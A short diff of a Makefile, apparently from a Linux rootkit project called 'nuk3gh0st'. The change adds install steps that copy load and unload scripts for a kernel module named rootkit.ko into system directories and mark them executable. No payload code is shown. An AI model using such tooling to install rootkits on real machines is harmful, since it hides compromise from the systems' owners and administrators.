@@ -10,6 +10,10 @@ client:
 install:
 	cp nuk3gh0st /usr/bin/nuk3gh0st
 	cp rootkit.ko /usr/lib/rootkit.ko
+	cp load-nuk3gh0st /usr/bin/load-nuk3gh0st
+	cp unload-nuk3gh0st /usr/bin/unload-nuk3gh0st
+	chmod +x /usr/bin/load-nuk3gh0st
+	chmod +x /usr/bin/unload-nuk3gh0st
 uninstall:
 	rm /usr/bin/nuk3gh0st
 	rm /usr/lib/rootkit.ko
